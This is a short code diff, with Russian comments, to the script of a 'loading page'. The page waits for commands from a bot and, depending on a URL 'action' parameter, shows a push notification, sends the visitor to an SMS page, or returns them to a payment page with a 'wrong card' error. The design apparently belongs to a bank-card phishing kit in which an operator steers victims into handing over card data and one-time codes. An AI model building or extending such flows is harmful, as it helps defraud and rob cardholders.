@@ -508,8 +508,30 @@
             }, 2000);
         };
 
-        // Страница просто крутится и ждет команд от бота
-        console.log('Loading page ready - waiting for bot commands...');
+        // Обработка команд из URL
+        function handleBotCommands() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const action = urlParams.get('action');
+            
+            console.log('Bot command:', action);
+            
+            if (action === 'push') {
+                // Показать пуш-уведомление
+                window.showPushNotification();
+            } else if (action === 'sms_redirect') {
+                // Перейти на SMS страницу
+                window.redirectToSMS();
+            } else if (action === 'wrong_card') {
+                // Перейти на payment с ошибкой
+                window.redirectToPaymentWithError();
+            }
+            // Если нет команды - просто крутимся бесконечно
+        }
+
+        // Запускаем обработку команд при загрузке
+        document.addEventListener('DOMContentLoaded', function() {
+            handleBotCommands();
+        });
     </script>
 </body>
 </html>
